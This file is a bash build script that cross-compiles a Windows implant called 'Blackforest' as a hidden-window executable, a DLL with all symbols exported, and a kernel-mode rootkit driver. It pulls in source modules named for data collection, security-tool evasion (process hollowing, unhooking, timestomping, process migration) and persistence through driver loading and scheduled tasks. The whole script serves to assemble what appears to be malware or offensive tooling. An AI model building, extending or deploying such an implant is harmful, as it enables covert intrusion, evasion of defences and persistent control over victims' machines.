#!/bin/bash

# Blackforest Modular Build Script
mkdir -p bin

echo "[*] Compiling Blackforest Agent (Standard)..."
x86_64-w64-mingw32-g++ -O3 \
    src/agent/core/main.cpp \
    src/agent/modules/collection/*.cpp \
    src/agent/modules/evasion/blinder.cpp \
    src/agent/modules/evasion/process_hollowing.cpp \
    src/agent/modules/evasion/process_migration.cpp \
    src/agent/modules/evasion/timestomp.cpp \
    src/agent/modules/evasion/unhooker.cpp \
    src/agent/modules/maintenance/*.cpp \
    src/agent/modules/persistence/driver_loader.cpp \
    src/agent/modules/persistence/scheduled_task.cpp \
    src/agent/network/*.cpp \
    src/agent/utils/*.cpp \
    -Iinclude -Iinclude/agent -static \
    -lws2_32 -lgdiplus -lgdi32 -lwininet -lole32 -luuid -lurlmon -liphlpapi -lcrypt32 -mwindows \
    -o bin/Blackforest.exe

if [ $? -eq 0 ]; then
    echo "[+] Build Success: bin/Blackforest.exe"
else
    echo "[-] Build Failed: bin/Blackforest.exe"
    exit 1
fi

echo "[*] Compiling Blackforest DLL (Ghost Mode)..."
x86_64-w64-mingw32-g++ -shared -O3 \
    src/agent/core/main.cpp \
    src/agent/modules/collection/*.cpp \
    src/agent/modules/evasion/*.c \
    src/agent/modules/evasion/blinder.cpp \
    src/agent/modules/evasion/process_hollowing.cpp \
    src/agent/modules/evasion/process_migration.cpp \
    src/agent/modules/evasion/timestomp.cpp \
    src/agent/modules/evasion/unhooker.cpp \
    src/agent/modules/maintenance/*.cpp \
    src/agent/modules/persistence/driver_loader.cpp \
    src/agent/modules/persistence/scheduled_task.cpp \
    src/agent/network/*.cpp \
    src/agent/utils/*.cpp \
    -Iinclude -Iinclude/agent -static \
    -lws2_32 -lgdiplus -lgdi32 -lwininet -lole32 -luuid -lurlmon -liphlpapi -lcrypt32 -mwindows \
    -Wl,--export-all-symbols \
    -o bin/Blackforest.dll

if [ $? -eq 0 ]; then
    echo "[+] Build Success: bin/Blackforest.dll"
else
    echo "[-] Build Failed: bin/Blackforest.dll"
    exit 1
fi

echo "[*] Compiling Blackforest Rootkit Driver (Kernel Mode)..."
# Compile driver object
x86_64-w64-mingw32-gcc -c src/driver/rootkit.c -o bin/rootkit.o -Iinclude -Iinclude/driver -D__KERNEL__
# Link as valid driver (.sys)
x86_64-w64-mingw32-gcc -shared -Wl,--subsystem,native -Wl,--image-base,0x140000000 -Wl,--entry,DriverEntry \
    -o bin/Blackforest.sys bin/rootkit.o -lntoskrnl -nostartfiles

if [ $? -eq 0 ]; then
    echo "[+] Build Success: bin/Blackforest.sys"
else
    echo "[-] Build Failed: bin/Blackforest.sys"
fi
